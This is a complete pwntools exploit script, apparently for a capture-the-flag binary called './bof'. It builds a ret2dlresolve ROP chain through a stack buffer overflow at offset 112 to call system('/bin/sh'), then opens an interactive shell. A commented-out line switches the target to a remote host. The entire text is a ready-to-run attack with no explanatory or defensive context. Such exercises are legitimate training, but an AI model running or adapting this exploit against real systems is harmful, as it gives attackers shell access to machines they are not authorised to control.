from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './bof'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

dl_resolve = Ret2dlresolvePayload(elf, symbol='system', args=["/bin/sh"])
rop.read(0, dl_resolve.data_addr)
rop.ret2dlresolve(dl_resolve)
raw_rop = rop.chain()
payload = flat({112:raw_rop, 256:dl_resolve.payload})
delimiter = "\n"
io.sendlineafter(delimiter, payload)
io.interactive()
